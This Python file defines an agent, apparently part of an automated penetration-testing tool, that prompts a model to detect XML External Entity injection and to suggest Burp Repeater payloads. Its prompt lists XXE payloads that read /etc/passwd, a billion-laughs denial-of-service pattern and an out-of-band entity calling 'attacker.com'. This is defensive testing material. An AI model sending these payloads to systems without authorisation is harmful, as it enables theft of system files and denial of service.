from .base_agent import BaseAgent


class XxeAgent(BaseAgent):
    """Agent for detecting XML External Entity (XXE) injection vulnerabilities."""
    name = "xxe"

    tactical_guide = """
1. Confirm the request actually declares/accepts XML (Content-Type, a
   `<?xml` body, or a SOAP-shaped envelope) -- this class does not apply to
   a JSON-only endpoint.
2. Check whether the body structure would allow a DOCTYPE/external-entity
   declaration to be added (is the root element and its immediate
   structure visible/predictable enough to graft one onto).
3. Blind XXE (no entity content reflected in the response) needs an
   out-of-band callback to confirm -- name that as the suggested_test
   explicitly rather than implying the response alone would show it.
"""

    @property
    def specialty_prompt(self) -> str:
        return """
XML External Entity (XXE) injection. Look for:

XML CONTENT INDICATORS:
- Content-Type headers: application/xml, text/xml, application/soap+xml
- Request bodies containing XML tags (<tag>content</tag>)
- SOAP action headers
- XML prologs (<?xml version="1.0"?>)
- DOCTYPE declarations in request or response
- Entity references (&entity;)

VULNERABILITY SIGNALS:
- File upload endpoints accepting XML files
- API endpoints using SOAP protocol
- XML parsing error messages in responses
- DTD (Document Type Definition) references
- ENTITY declarations in XML
- External entity references (SYSTEM, PUBLIC)
- XML comments with suspicious content
- Billion laughs attack patterns (recursive entities)
- Out-of-band (OOB) XXE indicators

ATTACK PATTERNS:
- External entity inclusion: <!ENTITY xxe SYSTEM "file:///etc/passwd">
- Parameter entities: <!ENTITY % file SYSTEM "file:///etc/passwd">
- DTD inclusion: <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
- Billion laughs: <!ENTITY lol "lol"> <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
- OOB XXE: <!ENTITY xxe SYSTEM "http://attacker.com/xxe">

RESPONSE INDICATORS:
- File contents in response (successful XXE read)
- XML parsing errors revealing file system paths
- Entity expansion errors
- DTD processing errors
- External connection attempts (OOB)

For suggested_test, propose:
- Standard XXE payload with file read: <!ENTITY xxe SYSTEM "file:///etc/passwd">
- Parameter entity XXE: <!ENTITY % file SYSTEM "file:///etc/passwd"> %file;
- Billion laughs test for DoS
- OOB XXE to external server
- Blind XXE with error-based detection

suggested_test MUST be concrete XML payloads that can be sent via Burp Repeater:
- "Send XML with external entity referencing /etc/passwd"
- "Test parameter entity XXE with DTD inclusion"
- "Send billion laughs payload for DoS testing"
"""
